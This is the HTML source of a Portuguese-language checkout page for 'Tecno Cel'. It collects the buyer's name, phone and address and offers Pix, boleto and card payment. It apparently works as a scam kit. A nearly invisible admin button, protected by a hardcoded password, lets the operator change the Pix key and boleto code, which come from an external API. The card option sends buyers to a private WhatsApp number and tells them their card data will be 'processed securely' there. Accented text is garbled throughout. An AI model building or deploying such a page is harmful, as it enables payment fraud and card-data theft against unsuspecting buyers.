<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Tecno Cel ‚Ä¢ Finalizar Compra</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
*{box-sizing:border-box}
body{
  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial;
  background:#f2f4f7;
  margin:0;
  min-height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
}
.app{
  background:#fff;
  width:100%;
  max-width:420px;
  border-radius:18px;
  box-shadow:0 20px 45px rgba(0,0,0,.08);
  overflow:hidden;
  position:relative;
}
.header{
  padding:18px;
  text-align:center;
  border-bottom:1px solid #eee;
}
.logo{
  font-size:22px;
  font-weight:700;
}
.price{
  font-size:28px;
  color:#2e7d32;
  font-weight:700;
  margin-top:6px;
}
.page{display:none;padding:20px}
.page.active{display:block}

input{
  width:100%;
  padding:12px;
  margin-top:10px;
  border-radius:10px;
  border:1px solid #ccc;
}
button{
  width:100%;
  padding:14px;
  margin-top:16px;
  border:none;
  border-radius:12px;
  background:#2e7d32;
  color:#fff;
  font-size:16px;
  font-weight:600;
  cursor:pointer;
}
.back{background:#eef1f4;color:#333}

.option{
  border:1px solid #ddd;
  border-radius:14px;
  padding:16px;
  margin-top:14px;
  display:flex;
  justify-content:space-between;
  cursor:pointer;
}
.option:hover{border-color:#2e7d32;background:#f6fff8}

.code{
  background:#f7f9fc;
  border:1px dashed #cfd8dc;
  padding:14px;
  border-radius:12px;
  word-break:break-all;
  font-size:13px;
  margin-top:10px;
}
.secure{
  text-align:center;
  font-size:12px;
  color:#777;
  margin-top:14px;
}
.admin-btn{
  position:absolute;
  top:12px;
  right:12px;
  opacity:.15;
  cursor:pointer;
}
</style>
</head>

<body>

<div class="app">

<div class="admin-btn" onclick="abrirAdmin()">‚öôÔ∏è</div>

<div class="header">
  <div class="logo" id="empresaNome">Tecno Cel</div>
  <small>Checkout seguro</small>
  <div class="price">R$ 99,90</div>
</div>

<!-- FORMUL√ÅRIO -->
<div id="form" class="page active">
  <input id="nome" placeholder="Nome completo">
  <input id="telefone" placeholder="Telefone">
  <input id="endereco" placeholder="Endere√ßo completo">
  <button onclick="continuar()">Continuar</button>
  <div class="secure">üîí Seus dados s√£o usados apenas para esta compra</div>
</div>

<!-- M√âTODOS -->
<div id="home" class="page">
  <div class="option" onclick="show('pix')">üîë Pix <span>Imediato</span></div>
  <div class="option" onclick="show('boleto')">üßæ Boleto <span>At√© 2 dias √∫teis</span></div>
  <div class="option" onclick="pagamentoCartao()">üí≥ Cart√£o <span>WhatsApp</span></div>
</div>

<!-- PIX -->
<div id="pix" class="page">
  <h3>Chave Pix</h3>
  <div class="code" id="pixKey"></div>
  <button onclick="copiar('pixKey')">Copiar Pix</button>
  <button class="back" onclick="show('home')">Voltar</button>
</div>

<!-- BOLETO -->
<div id="boleto" class="page">
  <h3>C√≥digo do Boleto</h3>
  <div class="code" id="boletoKey"></div>
  <button onclick="copiar('boletoKey')">Copiar Boleto</button>
  <button class="back" onclick="show('home')">Voltar</button>
</div>

<!-- ADMIN -->
<div id="admin" class="page">
  <input id="adminEmpresa" placeholder="Nome da empresa">
  <input id="adminPix" placeholder="Chave Pix">
  <input id="adminBoleto" placeholder="C√≥digo do boleto">
  <input id="adminSenha" type="password" placeholder="Senha admin">
  <button onclick="salvarAdmin()">Salvar altera√ß√µes</button>
  <button class="back" onclick="show('form')">Fechar</button>
</div>

</div>

<script>
const API = 'https://troca-api.onrender.com';
let dadosCliente = {};

fetch(API+'/config')
.then(r=>r.json())
.then(c=>{
  empresaNome.innerText = c.empresa;
  pixKey.innerText = c.pix;
  boletoKey.innerText = c.boleto;
  adminEmpresa.value = c.empresa;
  adminPix.value = c.pix;
  adminBoleto.value = c.boleto;
});

function show(id){
  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
  document.getElementById(id).classList.add('active');
}

function continuar(){
  dadosCliente = {
    nome:nome.value,
    telefone:telefone.value,
    endereco:endereco.value
  };
  show('home');
}

function copiar(id){
  navigator.clipboard.writeText(document.getElementById(id).innerText);
  alert('Copiado com sucesso');
}

function pagamentoCartao(){
  const msg = `
Pagamento via CART√ÉO - Tecno Cel

Nome: ${dadosCliente.nome}
Telefone: ${dadosCliente.telefone}
Endere√ßo de entrega: ${dadosCliente.endereco}

‚ö†Ô∏è Os dados do cart√£o ser√£o enviados neste WhatsApp
e processados com seguran√ßa pela Gateway Online.
`;
  window.location.href =
    'https://wa.me/5516981095904?text=' + encodeURIComponent(msg);
}

function abrirAdmin(){
  const s = prompt('Senha admin');
  if(s === '001533') show('admin');
}

function salvarAdmin(){
  fetch(API+'/config',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({
      empresa:adminEmpresa.value,
      pix:adminPix.value,
      boleto:adminBoleto.value,
      senha:adminSenha.value
    })
  }).then(()=>location.reload());
}
</script>

</body>
</html>
